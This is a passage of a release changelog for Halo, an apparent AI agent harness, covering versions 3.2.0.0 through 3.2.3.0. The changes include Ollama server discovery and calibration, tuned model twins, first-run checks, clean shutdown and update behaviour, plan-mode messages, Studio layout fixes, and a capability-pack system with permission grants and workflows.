- Prompt reading speed per host and model (`halo ollama`: "reads ~2,500 tok/s").
- `halo ollama` per model: the window in use, its source word, the prompt floor, calibrated / estimated / inconclusive, the tight window.

#### Changed
- Calibration: a load is a measurement only when `/api/ps` lists the model at the candidate's own `context_length` within the load's budget (local 20 s + 4 s/GB, remote 40 s + 6 s/GB); otherwise it is retried once with twice the budget and the run ends inconclusive, recording nothing.
- The first-use calibration keeps the turn's 20 s wait but finishes in the background and records then; its line appears on a later turn.
- The fit estimate of a loaded model comes from memory, not its loaded `context_length`; a remote host without `ssh:` has none.
- An Ollama 500 keeps its raw text and is sent three times at most.

#### Fixed
- A slow LAN host no longer saves a small window as "fits" (the 8,192 that cut Halo's 11k-token prompt).
- Ollama's 500 "no user query found in messages" is no longer retried six times as an internal error.
- A saved calibration below the request's size no longer holds the window under the prompt (discarded and measured again, once).

### R2: the servers are found, then measured

#### Added
- `halo ollama discover [--lan] [--add [NAME,NAME]] [--calibrate] [--json] [--timeout S]`: the Ollama servers on this machine (OLLAMA_HOST, 127.0.0.1 and [::1] on `ollama.discover.ports`, this machine's LAN address, `host.docker.internal`, a running WSL distro or, inside WSL, the Windows host), each confirmed by `/api/version` and `/api/tags`, one line per server with its models, `configured` or `new`; `--lan` also sweeps the /24 of this machine's LAN address plus `ollama.discover.subnets` (10 s cap, only when asked); `--add` writes the new ones as `ollama.hosts` entries (never repointing a host, the first stays the default); `--calibrate` measures every model of the added hosts, one progress line per model ("qwen3:30b on gpubox: 32k fits, 65k does not (2 min 10 s)").
- The wizard's Ollama tab: **Find Ollama servers** and **Scan this network** (a progress line), a tick per found server, Save adds the ticked ones, then "Calibrate the found models now (loads each model once; about N minutes: Enter runs it, Esc skips)". The Local models step lists the found servers read-only.
- Config keys `ollama.discover.ports` (default `[11434]`) and `ollama.discover.subnets`.

#### Changed
- `halo ollama` and `halo local` list an Ollama found on this machine but not in `ollama.hosts` as "found, not added (halo ollama discover --add)".
- The wizard's detection summary reports every local Ollama found ("Ollama at 127.0.0.1:11435: 1 model, not added"), not only the default host.
- `halo completion` offers `ollama`, `local` and the `halo ollama` words.

#### Fixed
- A second Ollama daemon, one in Docker or WSL, or one on another machine no longer has to be typed by hand before Halo can use it.

### R3: a tuned twin

#### Added
- `halo ollama tune MODEL [--host NAME] [--window N] [--remove] [--json]`: makes a tuned twin of MODEL on that host through `/api/create` -- `<name>-halo:<tag>` (`qwen3.8:27b` -> `qwen3.8-halo:27b`), `FROM MODEL`, `num_ctx` = the safe window calibration recorded (or N, held at the trained context), `num_gpu` = every layer -- sharing MODEL's weights; prints the plan line, Ollama's progress lines, the `/api/show` confirmation and the ref (`ol:<twin>@<host>`); `--remove` deletes a twin, never an original. Exit 0 / 1 / 2.
- `halo ollama` and `halo local` list a twin under its original: "tuned twin of qwen3.8:27b (65k window, all layers on the GPU)"; the `/model` picker and Studio's Models rows show the twin first for that host; Ollama catalog rows carry `twin_of`.
- `halo ollama discover --calibrate` and the wizard's calibrate offer end with "make tuned twins of the models that fit? (Enter / n)", one line per twin made; `--twins` makes them without asking, `--no-twins` skips the question.
- docs: MODELS-ollama-tuning "A tuned twin", COMMANDS-local `halo ollama tune`.

#### Changed
- `halo ollama discover --calibrate` and the wizard's calibration load every layer on the GPU and apply the headroom rule, like `halo ollama calibrate`: the window they record is the safe one.
- A twin starts calibrated (it carries its original's measured window).

### Also in 3.2.3.0

#### Fixed

- Studio's Fleet map could keep a stopped agent `running` for good when the end frame never corrected a frame-based state and the feed was open (so the page did not poll): while anything runs and no frame has come for 5 s the view is re-read on the poll tick, and an agent's end re-reads it at once (the Linux runner caught it twice).
- Roles: a card dropped into another tier (the held-over-a-collapsed-strip path included) lands inside that tier's box; before, the raw drop point could leave it in the other column, the tier box then spanned both columns and the next re-render re-packed the tier (GitHub's Windows runner saw it as three cards moving after a removal). The Windows special case of that test is gone.

#### Changed

## [3.2.2.0] - 2026-10-25

Focus: what the owner hit live on 2026-10-25, as six rounds -- the guided first run says what it does and never crashes, a quit leaves nothing behind and `halo update` clears what lingers, the session says what it is doing and plan mode never leaves you guessing, the canvas makes room, Studio sees what the session changes; and the launch shows the art.

### R1: the start never crashes

#### Fixed
- `halo start`: any error a step did not expect (or one from the command its screen shows) now fails that step with one line, `<Type>: <message>`, and `the full error is in <path>`. The start exits 1 with no traceback on the terminal. The traceback is appended to `~/.halo/start/<date>/<run or start>-error.log`.
- `halo start`: a failure before the first step (building the run) is one stderr line naming the log, exit 1.
- `halo init`: pressing Finish while the Summary's checks (doctor, live pong) were still running no longer prints a "worker wiz-summary-checks raised" traceback when the checks end after the wizard has closed. This is the traceback that appeared as "Run the ten-minute start now" began on Kali.
- Studio's Start here and the TUI `/start` panel: a start that fails, or cannot be built, ends with that one line and the log path, never a crash screen.

#### Changed
- `halo start --json` and Studio's `start` summary frame carry `error_log` (the log path) when the start failed on an unexpected error; `reason` is the one line.
- New module `halo_harness/start/errors.py` (`error_line`, `write_error_log`, `failed_summary`), shared by the engine, `halo start`, Studio's start job and the TUI panel.
- Docs: COMMANDS-init.md (`halo start`'s failed screen and the log), TROUBLESHOOTING.md ("`halo start` failed: read the log").

### R2: the first-run checks say what each does, and the user picks

#### Added
- `halo check`: the checks Halo offers after setup.
- The defaults are doctor, the model catalog and one hello call. The others are the quick gym and the guided first run.
- Flags: `--all`, `--doctor --catalog --hello --gym --start`, `--models REF,REF` for the gym, and `--explain` (the five rows: what each does, costs, takes and writes).
- Each check prints its title, that line and its results. Exit 1 when one failed.
- `/check` in the TUI: the same checks, with their lines in the transcript.
- `halo start --explain`: only the guided first run's card. The card shows:
- the seven steps, one sentence each;
- the models it will call;
- an estimated cost by a stated rule (one lead plan, five worker lanes, one judge pass, each with a token budget, at the catalog's prices): "free" when every model is local, "unknown for <model>" when the catalog has no price;
- the time and what it writes;
- that your active lineup is not touched.
- The glossary word "guided first run" (`halo explain guided first run`).

#### Changed
- "The ten-minute start" is now "the guided first run" everywhere: `halo start`, `/start`, Studio's Start here and the palette, and the docs.
- `halo start` opens on its card. `--yes` prints it and goes on; `--json` leaves it out.
- Studio's Start here shows the same card above its button, which reads "Run the guided first run". `GET /api/start` carries it as `card`.
- `halo init`'s Summary: the one "Run the ten-minute start now" checkbox is now five check rows.
- Each row is a title and a muted line saying what it does, costs, takes and writes.
- Space toggles a row. Doctor, catalog and hello are on; the gym (with its models listed, local ones ticked) and the guided first run are off.
- Finish runs the ticked ones in order and prints each result. Finish again closes setup, then starts the guided first run when it was ticked.
- Before this, the doctor, catalog refresh and live pong ran unasked.
- The console path (`--yes`, no terminal) runs the same three as before.

#### Fixed
- The wizard Summary's result lines lost their `[OK]`/`[WARN]` marks (they were read as markup).
- Esc while the Summary's checks run stops the ones still to come and hands nothing to `halo start`.

### R3: halo exits clean, and halo update clears what lingers

#### Added
- `~/.halo/run/children.json` (halo_harness/children.py, children_stop.py): the Studio a session starts detached, `--bg` runs and schedule fires join it with their pid, start time and owner, so a quit and `halo update` can find and stop them.
- `halo update --keep-running`: stops nothing, names each halo process still running (what, pid, its first command words) with the command that stops it (`halo studio --stop`, `halo bg stop <id>`, `halo supervise stop`), and does not install.
- `/update` installs from a detached updater after halo has exited (`update.cmd` through `cmd.exe /c`, `update.sh` through `sh`), logging to `~/.halo/update.log`; halo prints the log path and the `halo --continue` line.

#### Changed
- A quit (`/quit`, Ctrl+C twice, Ctrl+D, Ctrl+Q) stops the Studio, the session's background runs and schedule fires and leftovers of a session that crashed, and says so in its last line ("stopped: Studio (pid 4242), 2 background runs"); the supervisor and runs started from a plain shell stay; while another halo session of the same home is open, the Studio stays for it. The end of `-p` stops what that run started.
- The quit's line also names what it left running of this home, each with the command that ends it ("left running: 1 background run from a shell (halo bg stop <id>), Studio (another session is open; halo studio --stop), supervisor (halo supervise stop)"), so `halo update` never surprises anyone.
- `halo update` stops other open halo sessions of this install too, and says so one line each; `--keep-running` looks first.
- `halo update` stops every other process of this install before it installs (the registry first, then a process scan that now also knows the Studio, a `--bg` run's wrapper, the supervisor and this venv's model server), one line each, and starts the supervisor again on the new version; `--force` installs without stopping anything.
- `/update`'s dialog: Enter quits halo and the update runs after it exits (no in-process install, no relaunch).

#### Fixed
- `halo update` after quitting halo no longer refuses with "another halo process looks like it's running": the detached Studio, background runs and schedule fires that outlived the session are stopped.
- `/update` on Windows no longer fails with "Scripts: Access is denied" by reinstalling while its own `halo.exe` holds the venv.
- `halo studio --stop` on Windows ends a Studio whose shutdown route does not answer (it cleared studio.json and left the process running).

### R4: the session says what it is doing, and plan mode never leaves you guessing

#### Added
- Every turn ends with one muted line: `◼ done · 42 s · 3 tools · $0.012`, `◼ waiting on you: <the question | the plan>`, or `◼ stopped: <max_tokens | max turns | the provider's error | a hook | the loop breaker | Esc>`. Studio's Session feed shows the same line, and a `waiting` line when a card asks you something.
- A reply that ends promising work ("Now I'll ...", "Let me ...") and calls no tool is nudged once (`↳ nudged: the reply promised work and stopped`); `turn.nudge_promises: false` turns it off.
- A model call that sends nothing for `steer.silent_restart_s` seconds (default 60, 0 off) is resent once with the same messages (`↳ no data for 60 s, resending the call`).
- `/plan [on|off|status]`: plan mode from the prompt, or which mode is on and where the plan file is.
- Each turn tells the model its permission mode in one line.

#### Changed
- The system prompt asks every model for one short line before a group of tool calls and, at a turn's end, what it found and what is next (or that it waits on you). Kimi's "do not add explanations" is gone.
- Plan mode runs every read: WebFetch, WebSearch, BashOutput, Skill, ToolSearch, knowledge_search, recall and any MCP tool its server marks `readOnlyHint`, besides Read/Glob/Grep and read-only Bash. In default and acceptEdits, the non-web read tools run without asking.
- A write in plan mode says what it does and the way out: `plan mode: Write writes; research with the read tools and the web, then call ExitPlanMode with the plan (Shift+Tab or /plan off leaves plan mode)`.
- The plan card shows its keys first (`[1] Approve, auto-accept edits · [2] Approve, manual · [3]/Esc Keep planning`), then the plan, capped with "... (N more lines; the plan file: <path>)".

#### Fixed
- Entering plan mode by Shift+Tab, `/plan on`, config or `--permission-mode plan` now tells the model (the plan-mode note with the plan file's path); leaving it says "Plan mode is off: implement the plan."
- A lazily started MCP server's read-only tools keep their `readOnlyHint` from the tools cache.

### R5: the canvas makes room

#### Added
- Studio: **Arrange** (the rail's LAYOUT foot beside Reset layout, and the palette) puts every open panel back in the section's default place and size in one press; strips stay strips and floating panels float.
- Studio: lib/geometry.ts, the shared rectangle math (`hits`, `nudgeApart`, `placeBeside`, `splitResize`) behind the workspace grid, the Roles canvas and Design's Artboards.

#### Changed
- Studio workspace: a panel dropped on another makes room. The neighbour gives up columns first, panels in the same columns trade places, and only then does the neighbour go down, never below the visible rows, live while you drag.
- Studio workspace: an edge or corner resize is a splitter; the panel on that edge shrinks or grows by the same columns or rows.
- Roles canvas: a card dropped on another nudges it aside in its tier, live while dragging. A drop into another tier lands beside the card it hits. The selected and the last-dropped card are drawn on top. The canvas grows with a drag.
- Roles canvas: cards no longer carry the shipped / user / project chip; the scope is in the Lineups and Bios lists and the Inspector's Assignment header.
- Roles: a card's id is its name plus an ordinal among the cards with the same name (`reviewer#0`, `reviewer#1`); layouts saved with the older index ids read with today's ids.
- Design: an artboard dropped on another makes room the same way.

#### Fixed
- Studio: a panel moved over another in Roles no longer pushes it below the window, where it seemed to disappear.
- Roles canvas: a card dropped on a collapsed tier no longer joins it and vanishes. The tier opens when the card is held over its strip; dropped there, the card stays where it was and a toast says so.
- Roles canvas: removing a card no longer moves the other cards' saved spots.

### R6: Studio sees what the session changes

#### Added
- Studio watches the lineup and bio folders (yours and the project's `.halo/`), `config.json` and `studio/layouts/` every 1.5 s (`studio/files_live.py`). It sends one `files_changed` frame per change set and kind (`lineups`, `bios`, `config`, `layouts`) on the live feed. A lineup your session edits, `halo teams apply`, or a bio saved from the terminal shows in the open page within two seconds, with no refresh.
- Roles: "<name> changed on disk" with **Reload** and **Keep mine** over the Inspector or the bio form when the file moves while you have unsaved edits. "<name> was deleted on disk" when the open lineup or bio is removed.
- Orchestra's LINEUP field offers every lineup by name, a list kept current from disk.

#### Changed
- Roles re-reads the lineup list, the open lineup (canvas, Inspector), the Bios panel and form, the card positions, the active mark and the default model when their files change. Team, Session (GET fleet on config), the model selects' "the lineup's" / "the default" answers and the Pack Manager's Templates re-read too.
- A browser feed scoped to one session receives `files_changed` frames as well (like `sessions`).

#### Fixed
- Studio no longer needs a page refresh to show a lineup, bio, config or layout change that a session, the CLI or another Studio wrote.

### Also in 3.2.2.0

#### Fixed

- Roles: two layout saves could be in flight at once (a drag's debounced save still out when the next began) and land out of order, so older card positions won on disk; saves now go one at a time and the newest state goes out last (the Windows runner caught it three times).
- Studio's Start here could show a step as `running` after the guided first run had finished: the run step floods the live feed and its last frame could fall off the browser's queue. The page now re-reads the job after the summary frame and whenever the feed says `dropped` (the Windows runner caught it).

#### Changed

- The launch intro is the HALO block-art wordmark every time (the owner, 2026-10-25: "drop the one-liners ... just pop up the halo ascii art each time halo launches"): the copy-of-a-copy line and the Red Dragon line are gone from the pool; `/intro` and `/intro <n>` show the art.

## [3.2.1.0] - 2026-10-24

Focus: packs, the loose ends -- the sixteen open points the Packs program left, as five rounds (the owner, after installing 3.2.0.0: "Keep going").

### R1: a pack's lineup reaches the goal, the mission and the glossary

#### Added
- `halo fleet mission new --lineup NAME` and a **Lineup** select on Studio's Mission form (the lineups `halo teams` lists, the active one first): the mission records the lineup, its plan and status tables and MISSION.md say `lineup: <name>` (and a pack's metadata), Studio's mission head says it; a name no lineup folder holds is one line.
- "pack" in the glossary: `halo explain pack`, `/explain`, Studio's Glossary, the Packs section's words.
- Three model tags a bio (and a fleet capability's `requires.models`) may ask for: `reasoning`, `open-weights`, `audio-out`, read from the enriched catalog rows.

#### Changed
- `halo goal add --lineup` and Studio's Orchestra goal form take the lineup's acceptance the way `halo orchestra new` does (an empty test gets the lineup's, `review: true` the plan review); the lines say what was taken (`halo goal add`, the goal's history, "test from the lineup: <command>" under the form's test field). A test you give wins; a compiled workflow keeps its stages' test and plan.
- The `local` tag reads the row's own `local` (a Hugging Face router row is remote).

#### Fixed
- An edit by hand inside an installed pack's agents/, teams/ or workflows/ shows at the next lookup (it waited for the next install, update or enable).
- After a reload Studio paints the pack section you were on first, with a "loading the pack's section" line until its panels come, instead of the core section it fell back to.

### R2: a workflow run keeps its shape

#### Added
- `halo teams show` prints a lineup's workflows as `<pack>/<name>` refs (`workflows: doc-review/review (halo workflow run doc-review/review)`). The resolved lineup carries `workflow_refs` beside `workflows`.
- A lineup of yours may name any pack's workflow as `<pack>/<name>`. `halo teams validate` gives one line for a ref no running pack holds. A clone's bare name resolves inside the pack it came from (`from_pack`).
- Orchestra's Start view has a select, "or run a pack's workflow", under the goal form. It lists the workflows of the packs that run here, and a pick fills in the same form the Pack Manager's Run <workflow> does.
- The gate's verdict carries each `verify.evidence` item of a workflow stage as a line under its lane (`evidence report: 213 bytes, sha256 3f9a1c0b7d2e`, or `missing`). The run report prints it, and the conflict judge reads the incoming lane's.

#### Changed
- The supervisor's replanner never pauses a workflow run. When a replan mode is set, "a workflow run keeps its stage set (its plan is pinned by <pack>/<name>)" is said once each on the goal row, in the run's events, in `halo goal show` and in `halo supervise status`.
- A workflow's own `budget_usd` now stops a plain Orchestra run too, not only one under `--as goal`. Before each stage pass, the run's spend is checked against it (`STOP: budget: the run spent <spent> of <cap> USD (the workflow's budget_usd)`), and the report says the cap and the spend.
- A pack's lineup may name its own workflow as `<id>/<name>`; naming another pack's is a manifest line.
- The docs now say what `gate: human` is: the plan review before the run starts. A hold before one stage is not a thing yet.

#### Fixed
- The workflow gate's evidence reached only the record check's count. It now also reaches the verdict's evidence, which the report and the judge read.
- A plain run's report said a workflow's `budget_usd` was "not enforced yet".

### R3: the hub holds what a pack declares

#### Added
- A pack capability's `capacity.parallel` is held by the hub: a ready part whose capability already runs that many parts on its harness (in every mission the hub runs) is `waiting` ("part 3 waits: bob@member runs 2/2 of pack doc-review: docs.review", in the mission log, on the part, in `halo fleet mission status` and on the Mission panel's Running face) and starts when one ends.
- A part a worker refuses for a pack reason ("this harness does not run pack doc-review with bash") is re-planned once onto another harness that has the capability: the plan, MISSION.md and the part's brief move it, it goes back to `pending`, and "part 1 replanned: bob@member refused (...); alice@hub has pack doc-review: docs.review" is in the log, on the part and in the report's decisions. With no such harness the log says "part 1 not replanned: no other harness has docs.review" and the part fails with the worker's line as before.
- A pack's inspector lines carry their file's text in the capabilities catalog (the first 8 KB, paths cut, `cut` when longer), and Studio shows a member's inspector lines as it shows its own harness's.
- `halo pack doctor` says how many of a pack's fleet capabilities `fleet.capabilities.hide` hides; `halo pack inspect` marks each one.

#### Changed
- A mission's lead reads a capacity as "docs.review (pack doc-review, 2 at a time)", with the rule that the hub holds the rest.
- A mission part has a new state, `waiting` (the work state machine's `ready`); `halo fleet mission status` prints its line and a re-planned part's line.

#### Fixed
- `fleet.capabilities.hide` hides a pack capability (`docs.review`, or `doc-review/docs.review` for one pack's) like a built-in one: the catalog, a mission's lead, `who` and Studio no longer offer it.
- `capacity.parallel` was shown to the planner and never held.
- A part refused for a pack reason failed its mission even when another harness had the capability.
- A member's pack inspector line said "its Studio reads this file" instead of showing it.

### R4: hooks and the update pause, for everyone

#### Added
- `halo pack update` asks before the swap in a terminal: it prints the migration notes, the files that change and the settings it renames, then `Apply? [y/N]`. `n` or Enter leave the pack as it is (`<id> <version> stays as it is`, exit 1). `--yes` skips the question; `--json`, `--dry-run` and a run that is not in a terminal never ask, as before. What you are shown is read from the same fetched source the update then uses.
- The dry run (`halo pack update <id> --dry-run`, and the Pack Manager's Update confirm in Studio) lists the files that change, one line each (`  README.md (changed)`, `(new)`, `(dropped)`).

#### Changed
- `${CLAUDE_PLUGIN_ROOT}` in a plugin's or a pack's `hooks/hooks.json` is filled per field. A hook's shell `command` gets the path as its shell reads it: forward slashes on Windows, quoted when it holds a space or another character the shell reads, escaped inside the command's own `"..."` or `'...'`. `args` (the exec form), every other field and `shell: "powershell"` get the path as it is. `${halo_python}` written inside quotes is escaped the same way. The docs say both hook forms work and that the exec form stays the recommended one.
- PACKS.md, COMMANDS-packs.md and EXTENSION_API.md now state the rollback rule: `<id>.previous` is the one version kept, the next update replaces it, and there is no version history on disk.

#### Fixed
- On Windows, a plugin hook in the shell form that used `${CLAUDE_PLUGIN_ROOT}` (`sh ${CLAUDE_PLUGIN_ROOT}/hooks/run.sh`) failed with "No such file or directory", because Git Bash ate the backslashes of the pasted path. It now runs, from a folder with a space too.

### R5: the Linux pass

#### Added
- docs/DEVELOPMENT.md "The Chrome tier on Linux": how to run the Chrome tests on Kali (the distro's chromium) and on WSL (Playwright's Chromium named by `HALO_CHROME`), what a skip means, Chrome as root, and what WSL is and is not a twin for (its Chromium's 757 px viewport, its clock).

#### Changed
- In a skill's `` !`cmd` `` span, `${CLAUDE_SKILL_DIR}`, `${CLAUDE_PROJECT_DIR}` and the other `${CLAUDE_...}` values go in as the span's shell reads them, the same way a plugin hook's shell command gets `${CLAUDE_PLUGIN_ROOT}`: forward slashes on Windows, quoted when the value holds a space, escaped inside your own quotes. The rest of the body gets the value as it is.
- The test suite's headless Chrome adds `--no-sandbox` when it runs as root, and only then, so the Chrome tests start in a Kali root shell or a container.
- `tests/run_all.py` keeps `HALO_CHROME` (it clears every other `HALO_*`), so a Linux box whose Chromium is not on PATH can name it.

#### Fixed
- On Windows, a skill whose body runs `` !`sh ${CLAUDE_SKILL_DIR}/scripts/x.sh` `` failed with "No such file or directory", because Git Bash ate the backslashes of the pasted folder. It now runs, from a folder with a space too.
- Studio: a finished agent's green glow on the Session and Fleet maps could stay on long after its ten seconds when the computer's clock stepped back (WSL2 and VMs do). It now fades on time.
- Linux: the wizard tests no longer download ripgrep into your real `~/.local/bin` on a box without `rg`. The screenshot check and the version-line checks pass in a full clone and on a box without `rg`. Two Studio browser checks scroll their target into view, so they pass on a short screen.

### Also in 3.2.1.0

#### Fixed

- Studio's Fleet map could keep a stopped agent `running`: a frame that fell off the browser's bounded event queue under a flood, or one lost while the stream reconnected, was never corrected because the page re-read the fleet view only while the stream was closed. The stream now says `dropped` when frames fell off, and the page re-reads the fleet view then and on every stream open.
- A hand-written plan.json that fails the check becomes plan.bad.json in one write with its `problems`, then plan.json goes; before, the move came first and a reader in between (Studio's poll, a test on a fast runner) saw the bad plan without its problems.
- A print-mode run started with `--input-format stream-json` registered its control socket before its turn queue existed, so a `submit` over the socket in that moment was answered with the one-prompt error (or taken as a steer); the queue exists before the socket is registered, and `status` says `accepts_turns`.

## [3.2.0.0] - 2026-10-24

Focus: packs -- "one harness, one Studio, multiple independently maintained capability packs" (the ten-phase program the owner pasted 2026-10-21). Every round reuses the registries Halo has; the six sections and every CLI are unchanged with no pack installed.

### R1: packs -- the contract, the manifest, the registry, the lifecycle

#### Added

- Packs: a folder with a `pack.yaml` at its root and a Claude-plugin layout (bios, lineups, skills, commands, hooks, MCP servers) adds to Halo without changing it. `halo pack list | inspect | install <path|git url> [--project] | enable [--grant NAME | --grant-all] | disable | update | remove [--keep-config] | doctor`, each with `--json` (docs/PACKS.md, docs/COMMANDS-packs.md).
- A pack lives in `~/.halo/packs/<id>/` or the repo's `.halo/packs/<id>/` (the untrusted layer: its lineups lose permission mode and allow rules). It is installed disabled; what it requests (`mcp:<server>`, `hooks`, `bash`, `network`, `home-write`) runs only once you grant it; disabling it changes nothing else; removing it deletes only its own files and lists your bios, lineups, memory folders and settings that stay.
- A pack's bios and lineups are listed as `<id>--<name>` (read in place, read-only in Studio: Duplicate makes your copy, which wins), its skills and commands as `<id>:<name>`, its MCP servers as `plugin_<id>_<server>`.
- The extension API 1.0 (`halo_harness.ext`, docs/EXTENSION_API.md): the one module a pack imports, with a status per part, the manifest's JSON schema and a fixture pack.
- Config: `packs.sources` (install a pack by id), `packs.settings.<id>` (checked against the pack's schema). `halo config where` and `halo doctor --config` gain a packs group.

### R2: roles and lineups from packs

#### Added

- A pack's bio asks for its model by what it must do: `models.capabilities: [long-context, vision, tools, ...]` runs it on the best model in your catalog with every tag (a family in `models.preference`, such as `claude-sonnet`, first) and on your default model when none has them, which `halo pack doctor`, `halo pack inspect` and the card in Studio say. A bio of yours may ask by tag too.
- A pack's bio keeps its own memory (`context.memory.namespace`, default the pack's id, in `~/.halo/packs/.data/<id>/memory/`): recall over it never mixes with yours or another pack's, and yours leaves every pack's out.
- `tools.needs` names the grants a pack's bio uses; the bio loads without them, and doctor, inspect and Studio name `halo pack enable <id> --grant <need>`.
- A lineup's `acceptance` may say `test: <command>` and `review: true`: `halo orchestra new --lineup <name>` starts with that test and pauses for the plan's review unless you give `--test`. A pack's lineup names its workflows (`workflows: [review]`, declared under `contributes.workflows`).
- Studio's Roles groups lineups and bios by where they live (yours, project, one box per pack, shipped); a pack's row has Preview (read-only), Clone (your copy, with `from_pack: <id>@<version>`), Customize (Clone, then the copy open) and Apply (the dialog names the pack and the lineup it replaces).
- `halo pack inspect` lists each bio with the model it runs on and the grants it needs, and each lineup with its members, tiers, workflows and acceptance; `halo agents list` and `halo teams list` print a group per pack.

#### Changed

- A pack's bio that names one provider (`models.provider`, an `or:`/`ant:`/`dbx:` model, a vendor/model path) and a pack lineup naming an undeclared workflow are manifest problems naming the file and line; such a pack does not install.
- Studio's New and Duplicate no longer write over a lineup or bio of yours with the same name: they answer that it is already yours.
- The doc-review fixture pack requests `bash` (its reviewer bio's need).

#### Fixed

- A file of yours named like a pack's bio or lineup is listed as shadowing it everywhere you look (`halo agents list`, `halo teams list`, `halo agents`, Studio's row and the pack's box); before, only `halo pack doctor` said so.

### R3: Studio contributions

#### Added

- A pack adds to Studio what its pack.yaml declares under `contributes.studio`: sections of its own after Orchestra (Alt+7, Alt+8, Alt+9; a thin "packs" divider in the tab strip and the rail), panels in a core section (strips under its own), palette lines in a "pack <id>" group, its settings form (`config_form: true`: a field per `config.schema` key, Save writes `packs.settings.<id>`), its own lines in Session's Live column and Fleet's Activity, and attention rows with its own label and keys. Six panel kinds: markdown, table, form, links, events, bundle.
- A `bundle` panel is the pack's own script (an ES module exporting `mount(el, api)`); it runs once you grant the new `studio-script` permission (`halo pack enable <id> --grant studio-script`), and until then the panel names that command.
- `/api/pack/registry`, `/api/pack/<id>/file/<path>`, `/api/pack/<id>/data/<path>` and `/api/pack/<id>/config`; a `pack_changed` frame on the live feed after enable, disable, install, update and remove (from Studio's process at once, from another terminal within two seconds).
- A pack raises an attention row by writing `attention/<row>.json` in its data folder; the answer lands in `answers/<row>.json` beside it.

#### Changed

- A pack's `contributes.studio` is checked with the manifest: an unknown panel kind, a source outside the pack's folder, a bundle without `studio-script`, a route to nothing and the rest are one line each naming the key and its pack.yaml line, and such a pack does not install or run.
- The doc-review fixture pack gains a Studio section, a Session panel, a palette line, the settings form, a review.done line and an attention kind; new fixtures studio-bundle, studio-bad-kind, studio-outside, studio-no-script.

#### Fixed

- A pack's `pack_event` frames showed nowhere in Studio; they now render in Session's Live column and Fleet's Activity, with the pack's line or a generic one.

### R4: Fleet capabilities from packs

#### Added

- A pack brings worker capabilities to the fleet: `contributes.fleet.capabilities` (a name from its `capabilities:` list, a description, what it requires of a host: tools, runtimes, platform, a GPU or RAM, a model by tag, the grants it needs, where its data must be, and how many parts it takes at once). Each one shows in the harness's capabilities catalog, available there or not and why (`halo fleet capabilities`, Studio's Capabilities card, `halo fleet who`).
- A mission part may name a pack capability in its needs: the lead sees each harness's pack capabilities and the ones only one harness has, and the part goes only to a harness where its pack runs with the grants; Studio's plan says "docs.review · pack doc-review on <harness>", and the selected part (and its agent in the Agent panel) shows the pack's own inspector lines.
- A mission started with a pack's lineup carries the pack's `mission.metadata` (MISSION.md, the Mission panel's head).
- `halo pack inspect` lists what a pack adds to Studio and to the fleet in one "contributes:" block (each fleet capability available here or not and why); `halo pack doctor` has a row for each capability not available here.

#### Changed

- The harness that gets a mission part checks its own packs again before the part runs, and before its owner is asked: a part whose pack is disabled there, or lacks a grant the capability requires, is refused with one line ("this harness does not run pack doc-review with bash"), and the mission goes on as it does when a harness drops out.
- A pack's `contributes.fleet` is checked with the manifest: a token, an environment reference (`$VAR`, `%VAR%`) or a path in a description is refused with its pack.yaml line, and every other path in an advertisement is cut to its last part before it leaves the machine; a name not in `capabilities:`, an unknown requires key, a grant the pack does not request and the rest are one line each.
- The doc-review fixture pack gains a docs.review fleet capability, an inspector line and mission metadata; new fixtures fleet-secret, fleet-unknown-name, fleet-needs-gpu.

#### Fixed

- A pack's `contributes.fleet` was stored and never read; the capabilities catalog is now also gathered afresh when Studio sees a pack change made in another terminal.

### R5: workflows and artifacts

#### Added

- A pack ships workflows: `workflows/<name>.yaml` (named in `contributes.workflows`) declares its prerequisites (tools, grants, capabilities, files), typed inputs (text, path, json, artifact:<schema>) and outputs, and stages that run in order (`after`) or at once, one job per file (`for_each`), each with its role (a bio of the pack), capability needs, a condition (`when` on an input or an upstream output), what it gives and takes, retries, a timeout, a budget, a gate and what verifies it. The workflow compiles to an Orchestra goal, its hand-offs and a pinned plan; the existing pipeline runs it. `halo workflow list | show | check | run <pack>/<name> [--input K=V] [--as orchestra|goal]`, `halo orchestra new --workflow`, `halo goal add --workflow`.
- Typed artifacts: a pack's `artifacts/<schema>.json` (listed under `contributes.artifacts`, with an `x-halo-view` of table, markdown or keyvalue). A workflow output of type `artifact:<schema>` is checked against it at the gate, copied to `<run>/artifacts/<name>/` and listed in the run's report; Studio draws it in the pack's own section (a panel of kind `artifact`) and in the Report panel's new Artifacts tab.
- Typed events: a pack's event kind may have a schema (`events/<kind>.json`). A mismatching event is published with its problems (Studio shows them under the line), every event is kept in the pack's events log, a bio's trigger can start on a pack event (`{event: doc-review:review.done}`) and a workflow stage can wait for one (`after_event`).
- Memory with provenance: `ext.memory.write(namespace, text, provenance)` writes a note and its `_meta.json` (where it came from, the run and stage, when, how long to keep it, the packs it is shared with). Recall reads a pack's namespace plus what other packs share with it; `halo recall --namespace <pack>/<name> --provenance` lists the entries and `halo recall prune` removes the ones past their days.
- `halo pack inspect` lists a pack's workflows, artifact schemas and event schemas in its "contributes:" block.

#### Changed

- `publish_event` refuses a pack that does not run here with one line instead of publishing for it, checks a declared kind's data against its schema, and keeps every event in `~/.halo/packs/.data/<id>/events.jsonl`.
- The Orchestra pipeline has workflow hooks, each a no-op for a goal without a workflow: the lead refines the briefs of a pinned plan (never the stage set), a lane carries its stage and can be skipped by its condition, the gate also checks typed outputs (a mismatch sends the lane back with each problem, up to the stage's retries), a stage's timeout is its worker's time limit and its budget stops the run before the lane starts.
- The doc-review fixture pack gains the review workflow, the review-report artifact schema with a "Last review report" panel, and review.done's schema; new failure fixtures wf-cycle, wf-unknown-role, wf-no-giver, wf-input-type.

#### Fixed

- A lane whose worker failed after the gate sent its piece back now says why in the run's stop reason.
- `contributes.workflows`, `contributes.artifacts` and the event names were read for their names only; a workflow file, an artifact schema and an event schema are now checked with the manifest, one line per problem naming the key and its line.

### R6: the Pack Manager and the reference pack

#### Added

- Studio's Packs section (Alt+7), the Pack Manager: Installed (every pack, its grants and health; Enable, Disable, Update, Remove with a confirm), Sources (`packs.sources` and the packs Halo ships; Install, Add / Remove a source), Details (the API and Halo ranges, dependencies, what keeps it from running here in the doctor's words, a Grant toggle per permission, what it contributes with links), Settings (any installed pack, a disabled one too) and Templates (its lineups and bios with Preview, Clone, Customize, Apply; Run <workflow>). Every action runs the code `halo pack` runs and shows its lines; `pack_changed` keeps it live.
- The Documentation Review reference pack ships with Halo (halo_harness/templates/packs/doc-review/), with its README as the guide to making your own pack; `halo pack install doc-review` finds it.
- `halo pack list --available`, `halo pack sources [add|remove <folder|git url>]`, `halo pack grant <id> NAME... [--off]`; `halo pack install` takes a bare id from `packs.sources` or the shipped packs.
